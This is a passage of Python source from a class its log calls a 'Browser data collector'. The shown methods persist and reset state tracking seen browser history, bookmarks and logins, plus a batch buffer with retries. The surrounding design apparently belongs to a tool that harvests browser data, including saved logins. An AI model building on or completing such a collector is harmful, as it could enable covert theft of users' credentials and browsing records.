                "retries": batch.retry_count,
            }
            self._storage.append_to_list(cache_path, batch_data)
        except Exception as e:
            log.error(f"Local storage failed: {e}")
    
    def _load_state(self):
        try:
            state = self._storage.read_dict(STATE_FILE)
            if state:
                self._known_history = set(state.get("known_history", []))
                self._known_bookmarks = set(state.get("known_bookmarks", []))
                self._known_logins = set(state.get("known_logins", []))
                self._stats = state.get("stats", self._stats)
        except Exception:
            pass
    
    def _save_state(self):
        try:
            self._storage.write_dict(STATE_FILE, {
                "known_history": list(self._known_history)[-10000:],
                "known_bookmarks": list(self._known_bookmarks)[-5000:],
                "known_logins": list(self._known_logins)[-2000:],
                "stats": self._stats,
                "updated_at": datetime.utcnow().isoformat(),
            })
        except Exception as e:
            log.error(f"State save failed: {e}")
    
    def get_stats(self) -> Dict:
        return dict(self._stats)
    
    def get_health(self) -> Dict:
        return {
            "running": self._running,
            "buffer_size": len(self._batch_buffer),
            "known_history": len(self._known_history),
            "known_logins": len(self._known_logins),
            "stats": self.get_stats(),
        }
    
    def reset_state(self):
        with self._lock:
            self._known_history.clear()
            self._known_bookmarks.clear()
            self._known_logins.clear()
            self._batch_buffer.clear()
            self._stats = {k: 0 for k in self._stats}
            self._save_state()
        log.info("Browser data collector state reset")
